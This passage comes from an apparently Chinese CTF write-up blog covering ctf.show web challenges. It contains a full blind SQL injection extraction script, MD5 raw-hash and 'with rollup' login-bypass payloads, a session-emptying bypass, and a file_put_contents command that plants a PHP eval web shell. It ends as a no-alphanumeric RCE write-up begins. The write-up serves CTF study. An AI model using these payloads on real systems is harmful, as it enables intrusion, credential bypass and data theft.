class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line"><span class="comment">#爆破数据库长度</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">database_length</span>(<span class="params">url, headers</span>):</span><br><span class="line">    databaselen = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">100</span>):</span><br><span class="line">        databaselen_payload = <span class="string">f&#x27;?id=-1/**/or/**/length(database())=<span class="subst">&#123;i&#125;</span>#&#x27;</span></span><br><span class="line">        response = requests.get(url + databaselen_payload, headers=headers)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;I asked nothing&quot;</span> <span class="keyword">in</span> response.text:</span><br><span class="line">            databaselen = i</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;数据库长度为:  &#x27;</span>+ <span class="built_in">str</span>(databaselen))</span><br><span class="line">    <span class="keyword">return</span> databaselen</span><br><span class="line"></span><br><span class="line"><span class="comment">#爆破数据库名</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">database_name</span>(<span class="params">url, headers,databaselen</span>):</span><br><span class="line">    database_name = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,databaselen):</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">32</span>,<span class="number">128</span>):</span><br><span class="line">            database_name_payload = <span class="string">f&#x27;?id=-1/**/or/**/ascii(substr((select/**/database())from/**/<span class="subst">&#123;i+<span class="number">0</span>&#125;</span>/**/for/**/1))=&quot;<span class="subst">&#123;j&#125;</span>&quot;#&#x27;</span></span><br><span class="line">            response = requests.get(url + database_name_payload, headers=headers)</span><br><span class="line">            <span class="keyword">if</span> <span class="string">&quot;I asked nothing&quot;</span> <span class="keyword">in</span> response.text:</span><br><span class="line">                database_name += <span class="built_in">chr</span>(j)</span><br><span class="line">                <span class="built_in">print</span>(database_name)</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;数据库名为:  &#x27;</span>+ <span class="built_in">str</span>(database_name))</span><br><span class="line">    <span class="keyword">return</span> database_name</span><br><span class="line"></span><br><span class="line"><span class="comment">#爆破表名</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">table_name</span>(<span class="params">url, headers,databasename</span>):</span><br><span class="line">    table_name = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="number">100</span>):</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">32</span>,<span class="number">128</span>):</span><br><span class="line">            table_name_payload = <span class="string">f&#x27;?id=-1/**/or/**/ascii(substr((select/**/group_concat(table_name)from/**/information_schema.tables/**/where/**/table_schema=&quot;<span class="subst">&#123;databasename&#125;</span>&quot;)from/**/<span class="subst">&#123;i+<span class="number">0</span>&#125;</span>/**/for/**/1))=&quot;<span class="subst">&#123;j&#125;</span>&quot;#&#x27;</span></span><br><span class="line">            response = requests.get(url + table_name_payload, headers=headers)</span><br><span class="line">            <span class="keyword">if</span> <span class="string">&quot;I asked nothing&quot;</span> <span class="keyword">in</span> response.text:</span><br><span class="line">                table_name += <span class="built_in">chr</span>(j)</span><br><span class="line">                <span class="built_in">print</span>(table_name)</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;表名为:  &#x27;</span>+ <span class="built_in">str</span>(table_name))</span><br><span class="line">    <span class="keyword">return</span> table_name</span><br><span class="line">    </span><br><span class="line"><span class="comment">#爆破字段名</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">column_name</span>(<span class="params">url, headers,table_name</span>):</span><br><span class="line">    column_name = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="number">100</span>):</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">32</span>,<span class="number">128</span>):</span><br><span class="line">            column_name_payload = <span class="string">f&#x27;?id=-1/**/or/**/ascii(substr((select/**/group_concat(column_name)from/**/information_schema.columns/**/where/**/table_name=&quot;<span class="subst">&#123;table_name&#125;</span>&quot;)from/**/<span class="subst">&#123;i+<span class="number">0</span>&#125;</span>/**/for/**/1))=&quot;<span class="subst">&#123;j&#125;</span>&quot;#&#x27;</span></span><br><span class="line">            response = requests.get(url + column_name_payload, headers=headers)</span><br><span class="line">            <span class="keyword">if</span> <span class="string">&quot;I asked nothing&quot;</span> <span class="keyword">in</span> response.text:</span><br><span class="line">                column_name += <span class="built_in">chr</span>(j)</span><br><span class="line">                <span class="built_in">print</span>(column_name)</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;字段名为:  &#x27;</span>+ <span class="built_in">str</span>(column_name))</span><br><span class="line">    <span class="keyword">return</span> column_name</span><br><span class="line"><span class="comment">#爆破数据</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">table_data</span>(<span class="params">url, headers</span>):</span><br><span class="line">    data = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="number">100</span>):</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">32</span>,<span class="number">128</span>):</span><br><span class="line">            payload =<span class="string">f&#x27;?id=-1/**/or/**/ascii(substr((select/**/flag/**/from/**/web8.flag)from/**/<span class="subst">&#123;i+<span class="number">0</span>&#125;</span>/**/for/**/1))=&quot;<span class="subst">&#123;j&#125;</span>&quot;#&#x27;</span></span><br><span class="line">            response = requests.get(url + payload, headers=headers)</span><br><span class="line">            <span class="keyword">if</span> <span class="string">&quot;I asked nothing&quot;</span> <span class="keyword">in</span> response.text:</span><br><span class="line">                data += <span class="built_in">chr</span>(j)</span><br><span class="line">                <span class="built_in">print</span>(data)</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;flag为:  &#x27;</span>+ <span class="built_in">str</span>(data))</span><br><span class="line">    <span class="keyword">return</span> data</span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    url = <span class="string">&quot;http://ca996ae0-234f-4906-a89e-eb287b82f1e9.challenge.ctf.show/index.php&quot;</span></span><br><span class="line">    headers = &#123;</span><br><span class="line">        <span class="string">&#x27;User-Agent&#x27;</span>: <span class="string">&#x27;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36&#x27;</span></span><br><span class="line">    &#125;</span><br><span class="line">    databaselength = database_length(url, headers)</span><br><span class="line">    databasename = database_name(url, headers,databaselength)</span><br><span class="line">    tablename = table_name(url, headers,databasename)</span><br><span class="line">    columnname = column_name(url, headers,tablename)</span><br><span class="line">    table_datas=table_data(url,headers)</span><br></pre></td></tr></table></figure>

<h2 id="web9"><a href="#web9" class="headerlink" title="web9"></a>web9</h2><h3 id="MD5的sql"><a href="#MD5的sql" class="headerlink" title="#MD5的sql"></a>#MD5的sql</h3><p><img src="/./../image/achieve/202411/ctfshow--web%E4%B8%93%E9%A2%98/image-20241205173413611.png" alt="image-20241205173413611"></p>
<p>很经典的登录界面，我以为是sql注入，但是后面测试发现打不通</p>
<p><img src="/./../image/achieve/202411/ctfshow--web%E4%B8%93%E9%A2%98/image-20241205173512199.png" alt="image-20241205173512199"></p>
<p>包告诉我看到php可以扫一下目录，那我拿dirsearch扫一下目录</p>
<p><img src="/./../image/achieve/202411/ctfshow--web%E4%B8%93%E9%A2%98/image-20241205175046006.png" alt="image-20241205175046006"></p>
<p>发现了一个robots.txt,访问后有一个文件</p>
<p><img src="/./../image/achieve/202411/ctfshow--web%E4%B8%93%E9%A2%98/image-20241205175208348.png" alt="image-20241205175208348"></p>
<p>下载下来</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">        <span class="variable">$flag</span>=<span class="string">&quot;&quot;</span>;</span><br><span class="line">		<span class="variable">$password</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;password&#x27;</span>];</span><br><span class="line">		<span class="keyword">if</span>(<span class="title function_ invoke__">strlen</span>(<span class="variable">$password</span>)&gt;<span class="number">10</span>)&#123;<span class="comment">#检查密码的长度是否大于10个字符</span></span><br><span class="line">			<span class="keyword">die</span>(<span class="string">&quot;password error&quot;</span>);</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="variable">$sql</span>=<span class="string">&quot;select * from user where username =&#x27;admin&#x27; and password =&#x27;&quot;</span>.<span class="title function_ invoke__">md5</span>(<span class="variable">$password</span>,<span class="literal">true</span>).<span class="string">&quot;&#x27;&quot;</span>;</span><br><span class="line">		<span class="variable">$result</span>=<span class="title function_ invoke__">mysqli_query</span>(<span class="variable">$con</span>,<span class="variable">$sql</span>);</span><br><span class="line">			<span class="keyword">if</span>(<span class="title function_ invoke__">mysqli_num_rows</span>(<span class="variable">$result</span>)&gt;<span class="number">0</span>)&#123;</span><br><span class="line">					<span class="keyword">while</span>(<span class="variable">$row</span>=<span class="title function_ invoke__">mysqli_fetch_assoc</span>(<span class="variable">$result</span>))&#123;</span><br><span class="line">						 <span class="keyword">echo</span> <span class="string">&quot;登陆成功&lt;br&gt;&quot;</span>;</span><br><span class="line">						 <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">					 &#125;</span><br><span class="line">			&#125;</span><br><span class="line">    <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>这个是md5加密漏洞</p>
<h3 id="MD5-SQL绕过漏洞"><a href="#MD5-SQL绕过漏洞" class="headerlink" title="MD5 SQL绕过漏洞"></a>MD5 SQL绕过漏洞</h3><h4 id="md5-string-raw-函数"><a href="#md5-string-raw-函数" class="headerlink" title="md5(string,raw)函数"></a>md5(string,raw)函数</h4><p>在 PHP 中，<code>md5()</code> 函数可以接受两个参数。第一个参数是要计算散列值的字符串，而第二个参数是一个布尔值，用于指定是否返回原始二进制格式的散列值。</p>
<ul>
<li>当第二个参数设置为 <code>false</code> 或者不提供时，<code>md5()</code> 函数将返回一个32位的十六进制散列值（即字符串形式的散列值）。</li>
<li>当第二个参数设置为 <code>true</code> 时，<code>md5()</code> 函数将返回一个16字节（128位）的二进制格式的散列值。这个二进制格式的散列值不是以文本形式表示的，而是以字节的形式表示。</li>
</ul>
<p>md5看似是非常强加密措施，但是一旦没有返回我们常见的16进制数，返回了二进制原始输出格式，在浏览器编码的作用下就会编码成为奇怪的字符串（对于二进制一般都会编码）。</p>
<p>我们使用md5碰撞，一旦在这些奇怪的字符串中碰撞出了可以进行SQL注入的特殊字符串，那么就可以越过登录了。</p>
<p>在经过长时间的碰撞后，比较常用的是以下两种：<br>数字型：<code>129581926211651571912466741651878684928</code><br>字符型：<code>ffifdyop</code></p>
<p>我们验证一下</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="variable">$a</span>=<span class="string">&#x27;ffifdyop&#x27;</span>;</span><br><span class="line">    <span class="variable">$b</span>=<span class="string">&#x27;129581926211651571912466741651878684928&#x27;</span>;</span><br><span class="line">    <span class="variable">$bb</span>=<span class="title function_ invoke__">md5</span>(<span class="variable">$a</span>,<span class="literal">TRUE</span>);</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$bb</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;\n&quot;</span>;</span><br><span class="line">    <span class="variable">$cc</span>=<span class="title function_ invoke__">md5</span>(<span class="variable">$b</span>,<span class="literal">true</span>);</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$cc</span></span><br><span class="line">    <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p><img src="/./../image/achieve/202411/ctfshow--web%E4%B8%93%E9%A2%98/image-20241205180453136.png" alt="image-20241205180453136"></p>
<p>可以看到这里有or语句</p>
<figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">ffifdyop 的MD5加密结果是 <span class="number">276</span>f722736c95d99e921722cf9ed621c</span><br><span class="line"></span><br><span class="line">经过MySQL编码后会变成<span class="string">&#x27;or&#x27;</span><span class="number">6</span>xxx,使<span class="keyword">SQL</span>恒成立,相当于万能密码,可以绕过md5()函数的加密</span><br></pre></td></tr></table></figure>

<p>就可以构造出必真的结果。</p>
<p>因为这里限制了长度，所以我们用ffifdyop</p>
<p><img src="/./../image/achieve/202411/ctfshow--web%E4%B8%93%E9%A2%98/image-20241205180831759.png" alt="image-20241205180831759"></p>
<p>直接传进去就可以了</p>
<h2 id="web10"><a href="#web10" class="headerlink" title="web10"></a>web10</h2><h3 id="虚拟表构造绕过"><a href="#虚拟表构造绕过" class="headerlink" title="#虚拟表构造绕过"></a>#虚拟表构造绕过</h3><p><img src="/./../image/achieve/202411/ctfshow--web%E4%B8%93%E9%A2%98/image-20241205182654245.png" alt="image-20241205182654245"></p>
<p>看到是php还是先扫一下目录</p>
<p><img src="/./../image/achieve/202411/ctfshow--web%E4%B8%93%E9%A2%98/image-20241205183351916-1733394833778-6.png" alt="image-20241205183351916"></p>
<p>没什么可用的信息</p>
<p>然后我们可以看到在页面中有一个取消的按钮，按了之后会下载一个index.phps</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">		<span class="variable">$flag</span>=<span class="string">&quot;&quot;</span>;</span><br><span class="line">        <span class="function"><span class="keyword">function</span> <span class="title">replaceSpecialChar</span>(<span class="params"><span class="variable">$strParam</span></span>)</span>&#123;</span><br><span class="line">             <span class="variable">$regex</span> = <span class="string">&quot;/(select|from|where|join|sleep|and|\s|union|,)/i&quot;</span>;</span><br><span class="line">             <span class="keyword">return</span> <span class="title function_ invoke__">preg_replace</span>(<span class="variable">$regex</span>,<span class="string">&quot;&quot;</span>,<span class="variable">$strParam</span>);</span><br><span class="line">        &#125;<span class="comment">#定义一个函数用来检查传入的参数</span></span><br><span class="line">        <span class="keyword">if</span> (!<span class="variable">$con</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&#x27;Could not connect: &#x27;</span> . <span class="title function_ invoke__">mysqli_error</span>());</span><br><span class="line">        &#125;<span class="comment">#检查数据库连接情况，这里对做题没用可以忽略</span></span><br><span class="line">		<span class="keyword">if</span>(<span class="title function_ invoke__">strlen</span>(<span class="variable">$username</span>)!=<span class="title function_ invoke__">strlen</span>(<span class="title function_ invoke__">replaceSpecialChar</span>(<span class="variable">$username</span>)))&#123;</span><br><span class="line">			<span class="keyword">die</span>(<span class="string">&quot;sql inject error&quot;</span>);</span><br><span class="line">		&#125;<span class="comment">#需要我们输入的username和经过检测函数后的username的长度一样</span></span><br><span class="line">		<span class="keyword">if</span>(<span class="title function_ invoke__">strlen</span>(<span class="variable">$password</span>)!=<span class="title function_ invoke__">strlen</span>(<span class="title function_ invoke__">replaceSpecialChar</span>(<span class="variable">$password</span>)))&#123;</span><br><span class="line">			<span class="keyword">die</span>(<span class="string">&quot;sql inject error&quot;</span>);</span><br><span class="line">		&#125;<span class="comment">#password也是一样</span></span><br><span class="line">		<span class="variable">$sql</span>=<span class="string">&quot;select * from user where username = &#x27;<span class="subst">$username</span>&#x27;&quot;</span>;</span><br><span class="line">		<span class="variable">$result</span>=<span class="title function_ invoke__">mysqli_query</span>(<span class="variable">$con</span>,<span class="variable">$sql</span>);<span class="comment">#使用 mysqli_query()函数执行之前构建的 SQL 查询。</span></span><br><span class="line">			<span class="keyword">if</span>(<span class="title function_ invoke__">mysqli_num_rows</span>(<span class="variable">$result</span>)&gt;<span class="number">0</span>)&#123;<span class="comment">#如果查询的结果大于0</span></span><br><span class="line">                <span class="comment">#使用 mysqli_fetch_assoc() 函数遍历结果集合，将每一行数据作为关联数组 ($row) 获取。</span></span><br><span class="line">					<span class="keyword">while</span>(<span class="variable">$row</span>=<span class="title function_ invoke__">mysqli_fetch_assoc</span>(<span class="variable">$result</span>))&#123;</span><br><span class="line">						<span class="keyword">if</span>(<span class="variable">$password</span>==<span class="variable">$row</span>[<span class="string">&#x27;password&#x27;</span>])&#123;</span><br><span class="line">                            <span class="comment">#检查输入的 $password 是否与数据库中检索到的用户的 password 字段相匹配。</span></span><br><span class="line">							<span class="keyword">echo</span> <span class="string">&quot;登陆成功&lt;br&gt;&quot;</span>;</span><br><span class="line">							<span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">						&#125;</span><br><span class="line">					 &#125;</span><br><span class="line">			&#125;</span><br><span class="line">    <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>应该是正常的sql注入+绕过，那我们还是先来解析一下这段代码(我直接把注释放在代码中了)</p>
<h3 id="mysqli-query-函数"><a href="#mysqli-query-函数" class="headerlink" title="mysqli_query()函数"></a>mysqli_query()函数</h3><p><code>mysqli_query()</code> 是 PHP 中用于执行 MySQL 查询的函数。</p>
<h3 id="mysqli-num-rows-函数"><a href="#mysqli-num-rows-函数" class="headerlink" title="mysqli_num_rows()函数"></a>mysqli_num_rows()函数</h3><p><code>mysqli_num_rows()</code> 是 PHP 中用于获取 MySQLi 结果集中行数的函数。这个函数通常用于在执行 SELECT 查询后确定返回的结果集中有多少行。它适用于使用 <code>mysqli_query()</code> 函数执行的查询。</p>
<h3 id="s符号"><a href="#s符号" class="headerlink" title="\s符号"></a>\s符号</h3><p>\s”在正则表达式中代表匹配空白字符的元字符。空白字符包括空格、制表符、换行符等，用\s来表示，可以匹配任意空白字符。</p>
<p>思路:</p>
<p>我们发现很多关键字<code> $regex = &quot;/(select|from|where|join|sleep|and|\s|union|,)/i&quot;;</code>都被过滤掉了，那么常规注入就不可行了，而且账户密码都进行了过滤，代码里面输出flag的要求是我们输入的password和数据库中的password是一样的，但是我们啥也不知道，那么怎么办呢？</p>
<h3 id="构建虚拟表with-rollup绕过"><a href="#构建虚拟表with-rollup绕过" class="headerlink" title="构建虚拟表with rollup绕过"></a>构建虚拟表with rollup绕过</h3><p>payload:</p>
<figure class="highlight nix"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">username:admin&#x27;<span class="comment">/**/</span><span class="keyword">or</span><span class="comment">/**/</span><span class="number">1</span><span class="operator">=</span><span class="number">1</span><span class="comment">/**/</span>group<span class="comment">/**/</span>by<span class="comment">/**/</span>password<span class="comment">/**/</span><span class="keyword">with</span><span class="comment">/**/</span>rollup<span class="comment">#</span></span><br><span class="line">password:</span><br></pre></td></tr></table></figure>

<p>with rollup:  mysql中的with rollup是用来在分组统计数据的基础上再进行统计汇总，用来得到group by的汇总信息。要配合 group by 一块儿使用，”group by password with rollup”,简单说一下，就是使用with rollup 查询以后，查询结果集合里面会多一条NULL 记录，这一题利用NULL 和空字符相等，而后获得flag。我们就是要通过with rollup使sql语句查询结果为null，然后不输入pwd使pwd为null就可以使$password&#x3D;&#x3D;$row[‘password’],通过验证输出我们的flag</p>
<h2 id="web11"><a href="#web11" class="headerlink" title="web11"></a>web11</h2><h3 id="session伪造"><a href="#session伪造" class="headerlink" title="#session伪造"></a>#session伪造</h3><p><img src="/./../image/achieve/202411/ctfshow--web%E4%B8%93%E9%A2%98/image-20241212184937818.png" alt="image-20241212184937818"></p>
<p>看到源码泄露了</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">        <span class="function"><span class="keyword">function</span> <span class="title">replaceSpecialChar</span>(<span class="params"><span class="variable">$strParam</span></span>)</span>&#123;</span><br><span class="line">             <span class="variable">$regex</span> = <span class="string">&quot;/(select|from|where|join|sleep|and|\s|union|,)/i&quot;</span>;</span><br><span class="line">             <span class="keyword">return</span> <span class="title function_ invoke__">preg_replace</span>(<span class="variable">$regex</span>,<span class="string">&quot;&quot;</span>,<span class="variable">$strParam</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">strlen</span>(<span class="variable">$password</span>)!=<span class="title function_ invoke__">strlen</span>(<span class="title function_ invoke__">replaceSpecialChar</span>(<span class="variable">$password</span>)))&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;sql inject error&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$password</span>==<span class="variable">$_SESSION</span>[<span class="string">&#x27;password&#x27;</span>])&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;error&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>有了上一题的学习，这道题的话我们发现这道题的条件明显比上一题要简单很多</p>
<p>因为我们要让password过滤前后的长度相等，并且要等于session中的password值，所以我们抓个包，然后我们输入应该password的值并且修改session中password的值是一样的就行</p>
<p>这里我们把phpsession的值给为空，然后把密码也改成空就行</p>
<p><img src="/./../image/achieve/202411/ctfshow--web%E4%B8%93%E9%A2%98/image-20241212185958532.png" alt="image-20241212185958532"></p>
<h2 id="web12"><a href="#web12" class="headerlink" title="web12"></a>web12</h2><h3 id="绕过disable-function"><a href="#绕过disable-function" class="headerlink" title="#绕过disable_function"></a>#绕过disable_function</h3><p><img src="/../image/achieve/202411/ctfshow--web%E4%B8%93%E9%A2%98/image-20250308212434968.png" alt="image-20250308212434968"></p>
<p>在页面源码中发现一个注释中提到参数cmd</p>
<p>get传入cmd为phpinfo();就可以出现php的配置信息，但是传入system函数没回显，传?cmd&#x3D;eval($_GET[1]);&amp;1&#x3D;phpinfo();但是对1传system依旧没回显，可能是权限不够，在phpinfo里面看一下disable_functions</p>
<p><img src="/../image/achieve/202411/ctfshow--web%E4%B8%93%E9%A2%98/image-20250308213719548.png" alt="image-20250308213719548"></p>
<p>可以看到system等执行命令的函数都被禁用了，试一下能不能连上蚁剑去绕过disable_functions</p>
<p>测一下能不能写入文件</p>
<p><img src="/../image/achieve/202411/ctfshow--web%E4%B8%93%E9%A2%98/image-20250308214036299.png" alt="image-20250308214036299"></p>
<p>然后访问1.txt看到显示123，说明可以写，并且目录就是当前目录</p>
<p>payload</p>
<figure class="highlight php-template"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="language-xml">file_put_contents(%271.php%27,%27</span><span class="language-php"><span class="meta">&lt;?php</span> <span class="keyword">eval</span>(<span class="variable">$_POST</span>[<span class="number">1</span>]);<span class="meta">?&gt;</span></span><span class="language-xml">%27);</span></span><br></pre></td></tr></table></figure>

<p>访问1.php并用蚁剑去连马，绕过disable_functions就可以了</p>
<p><img src="/../image/achieve/202411/ctfshow--web%E4%B8%93%E9%A2%98/image-20250308214729871.png" alt="image-20250308214729871"></p>
<h2 id="红包题第二弹"><a href="#红包题第二弹" class="headerlink" title="红包题第二弹"></a>红包题第二弹</h2><h3 id="无数字字母RCE"><a href="#无数字字母RCE" class="headerlink" title="#无数字字母RCE"></a>#无数字字母RCE</h3><p>和上一题一样的页面，随便对cmd传入一个值就出源码了</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;cmd&#x27;</span>]))&#123;</span><br><span class="line">        <span class="variable">$cmd</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;cmd&#x27;</span>];</span><br><span class="line">        <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/[A-Za-oq-z0-9$]+/&quot;</span>,<span class="variable">$cmd</span>))&#123;</span><br><span class="line">        </span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;cerror&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/\~|\!|\@|\#|\%|\^|\&amp;|\*|\(|\)|\（|\）|\-|\_|\&#123;|\&#125;|\[|\]|\&#x27;|\&quot;|\:|\,/&quot;</span>,<span class="variable">$cmd</span>))&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;serror&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable">$cmd</span>);</span><br><span class="line">    </span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"> <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>先用脚本输出可用字符</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#输出可用字符</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">for</span> (<span class="variable">$i</span>=<span class="number">32</span>;<span class="variable">$i</span>&lt;<span class="number">127</span>;<span class="variable">$i</span>++)&#123;</span><br><span class="line">        <span class="keyword">if</span> (!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/[A-Za-oq-z0-9$]+|\~|\!|\@|\#|\%|\^|\&amp;|\*|\(|\)|\（|\）|\-|\_|\&#123;|\&#125;|\[|\]|\&#x27;|\&quot;|\:|\,/&quot;</span>,<span class="title function_ invoke__">chr</span>(<span class="variable">$i</span>)))&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="title function_ invoke__">chr</span>(<span class="variable">$i</span>).<span class="string">&quot; &quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">&#125; </span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"><span class="comment">#+ . / ; &lt; = &gt; ? \ ` p | </span></span><br></pre></td></tr></table></figure>

<p>很简单，就是无数字字母里的临时文件上传rce</p>
<p>请求包</p>
